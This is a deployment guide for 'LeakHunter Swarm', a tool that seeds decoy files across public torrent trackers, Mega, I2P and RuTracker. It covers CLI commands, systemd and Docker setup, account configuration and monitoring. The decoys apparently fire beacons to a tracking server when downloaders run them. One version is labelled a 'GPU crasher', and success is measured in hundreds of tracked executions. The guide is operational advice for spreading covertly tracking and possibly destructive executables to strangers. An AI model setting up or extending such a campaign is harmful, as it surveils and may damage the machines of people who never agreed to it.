# LeakHunter Swarm - Deployment Guide

## Overview

This guide explains how to deploy the LeakHunter Swarm system in a production environment.

## Prerequisites

### System Requirements

- Python 3.8 or higher
- Linux/Unix-based system (recommended)
- Network connectivity for multi-platform distribution
- Storage for decoy files and logs

### Optional Infrastructure

- Proton Mail accounts (for Mega uploads)
- Torrent client/server (for Asteroth-Gate)
- I2P router (for Swarm Guardians)
- RuTracker account (for Russian tracker bot)
- Beacon server endpoint (for tracking)

## Installation

### 1. Clone Repository

```bash
cd /path/to/sovereignty-architecture
cd swarm_agents/leakhunter
```

### 2. Install Dependencies

```bash
# Core functionality (no external dependencies)
pip install -r requirements.txt

# Optional enhanced features
pip install -r requirements-optional.txt
```

### 3. Configure System

Edit `config.json` with your settings:

```json
{
  "proton_accounts": [
    "your_account1@proton.me",
    "your_account2@proton.me"
  ],
  "beacon_server": "https://your-beacon-server.com/beacon",
  "platforms": {
    "1337x": {"enabled": true},
    "i2p": {"enabled": true},
    "mega": {"enabled": true},
    "rutracker": {"enabled": true}
  }
}
```

## Deployment Modes

### Development/Testing Mode

Use the CLI for testing and development:

```bash
# Quick demo
./quickstart.sh

# Manual testing
python3 cli.py scoreboard --simulate
python3 cli.py status
```

### Production Mode

#### Option 1: Direct Execution

```bash
# Deploy decoy v2
python3 cli.py deploy-v2

# Deploy decoy v3 (GPU crasher)
python3 cli.py deploy-v3 --force

# Monitor continuously
while true; do
  python3 cli.py scoreboard
  sleep 60
done
```

#### Option 2: Systemd Service

Create `/etc/systemd/system/leakhunter-swarm.service`:

```ini
[Unit]
Description=LeakHunter Swarm - Decoy Distribution System
After=network.target

[Service]
Type=simple
User=leakhunter
WorkingDirectory=/opt/sovereignty-architecture/swarm_agents/leakhunter
ExecStart=/usr/bin/python3 leakhunter_swarm.py
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
```

Enable and start:

```bash
sudo systemctl enable leakhunter-swarm
sudo systemctl start leakhunter-swarm
sudo systemctl status leakhunter-swarm
```

#### Option 3: Docker Container

Create `Dockerfile`:

```dockerfile
FROM python:3.11-slim

WORKDIR /app
COPY swarm_agents/leakhunter /app/

RUN pip install -r requirements.txt

CMD ["python3", "leakhunter_swarm.py"]
```

Build and run:

```bash
docker build -t leakhunter-swarm .
docker run -d --name leakhunter \
  -v /path/to/config.json:/app/config.json \
  leakhunter-swarm
```

## Security Considerations

### 1. Beacon Server Security

- Use HTTPS for beacon endpoints
- Implement rate limiting
- Use authentication tokens
- Log all beacon calls

### 2. Credential Management

- Store Proton account credentials in vault (e.g., HashiCorp Vault)
- Rotate credentials regularly
- Use different accounts per platform
- Monitor for compromised accounts

### 3. Operational Security

- Run on dedicated infrastructure
- Isolate from production systems
- Monitor system logs
- Implement alerting for anomalies

### 4. Data Protection

- Generated decoys are marked as decoys in metadata
- No real data should ever be in decoy directories
- Regular audits of decoy content
- Separate storage for real assets

## Monitoring

### Log Files

The system generates several log files:

- `upload_history.json` - Mega upload records
- `beacons.json` - Beacon tracking data
- `asteroth_gate.json` - Torrent node status
- `swarm_guardians.json` - I2P mirror data
- `rutracker_bot.json` - Russian tracker data
- `decoy_v3.json` - V3 decoy specs
- `swarm_state.json` - Complete system state

### Metrics to Monitor

- Total downloads
- Execution rate (beacons fired)
- Active seeders
- Platform health
- Real file leaks (should always be 0)

### Alerting

Set up alerts for:

- Unexpected beacon patterns
- Platform failures
- High execution rates (potential widespread deployment)
- Any indication of real file leaks

## Maintenance

### Regular Tasks

1. **Daily:**
   - Check scoreboard
   - Review beacon logs
   - Verify platform status

2. **Weekly:**
   - Rotate credentials
   - Update decoy versions
   - Analyze trends

3. **Monthly:**
   - Security audit
   - Performance review
   - Decoy effectiveness analysis

### Updating Decoys

```bash
# Generate new decoy v3
python3 cli.py generate-v3 --model-name new-model --save

# Deploy updated decoys
python3 cli.py deploy-v3 --force
```

## Troubleshooting

### Common Issues

#### "No Proton accounts configured"

Update `config.json` with valid Proton email addresses.

#### Platform not responding

Check platform-specific logs and verify connectivity.

#### Beacons not registering

Verify beacon server endpoint is accessible and authenticated.

### Debug Mode

Enable debug logging:

```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

## Backup and Recovery

### Backup Strategy

1. **Configuration:**
   - Backup `config.json` securely
   - Store encrypted credentials separately

2. **State Data:**
   - Regular backups of all `.json` files
   - Retention: 90 days

3. **Logs:**
   - Centralize with ELK stack or similar
   - Retention: 30 days minimum

### Recovery Procedure

1. Restore configuration files
2. Verify platform connectivity
3. Re-deploy decoys if necessary
4. Resume monitoring

## Integration

### Prometheus Metrics

Export metrics for Prometheus:

```python
from prometheus_client import start_http_server, Counter, Gauge

downloads = Counter('leakhunter_downloads', 'Total downloads')
executions = Counter('leakhunter_executions', 'Total executions')
seeders = Gauge('leakhunter_seeders', 'Active seeders')

start_http_server(8000)
```

### Discord Notifications

Send alerts to Discord:

```python
import requests

def send_discord_alert(message):
    webhook_url = "YOUR_DISCORD_WEBHOOK"
    requests.post(webhook_url, json={"content": message})
```

## Production Checklist

- [ ] Configuration files updated
- [ ] Credentials securely stored
- [ ] Beacon server deployed and tested
- [ ] Platform accounts created and verified
- [ ] Monitoring and alerting configured
- [ ] Backup strategy implemented
- [ ] Documentation reviewed
- [ ] Security audit completed
- [ ] Team trained on operations
- [ ] Runbook documented

## Support

For issues or questions:

- Review documentation: `README.md`
- Check logs: `*.json` files in directory
- Security issues: `../../SECURITY.md`
- Community: `../../COMMUNITY.md`

## Success Metrics

Your LeakHunter Swarm is successful when:

✅ Thousands of decoy downloads
✅ Hundreds of executions tracked
✅ Multiple active seeders
✅ **Zero real files leaked**
✅ Empire status: 100% dark, 100% sovereign

---

**Remember:** The goal is not to leak, but to flood the ecosystem with decoys, making real leaks indistinguishable from fake ones.

**Empire status: 100% dark, 100% sovereign. 👑**
